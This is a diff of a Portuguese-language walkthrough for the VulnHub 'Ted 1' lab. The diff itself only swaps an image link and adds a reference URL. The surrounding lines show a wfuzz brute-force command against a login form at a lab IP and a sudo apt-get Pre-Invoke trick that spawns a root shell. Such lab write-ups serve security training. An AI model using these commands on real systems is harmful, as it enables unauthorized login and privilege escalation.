@@ -126,7 +126,7 @@ Pronto, agora fazemos o brute force com essa wordlist no Wfuzz
 wfuzz -t 200 -c -z file,senhas_hash_prontas.txt --hs hash -d "username=admin&password=FUZZ" http://192.168.56.134/authenticate.php
 ```
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-ted1/brute.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-ted1/wfuzz.png)
 
 Achamos o hash... agora é só jogar na internet que iremos descobrir que ele é do admin, essa wordlist é relativamente famosa e todas as senhas estão por ai.
 
@@ -217,3 +217,5 @@ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-ted1/sudo2.png)
+
+Referência: https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
